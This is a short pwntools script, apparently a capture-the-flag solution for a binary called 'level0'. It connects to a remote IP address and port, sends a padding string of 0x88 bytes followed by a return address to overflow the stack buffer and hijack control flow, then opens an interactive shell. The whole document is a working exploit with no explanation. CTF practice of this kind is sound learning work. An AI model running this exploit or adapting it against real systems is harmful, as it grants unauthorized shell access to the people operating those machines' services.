from pwn import *

#sh=process('./level0')
sh=remote('111.198.29.45','32440')
sh.recvuntil('World\n')
sh.sendline('a'*0x88+p64(0x400596))
#gdb.attach(sh)
sh.interactive()
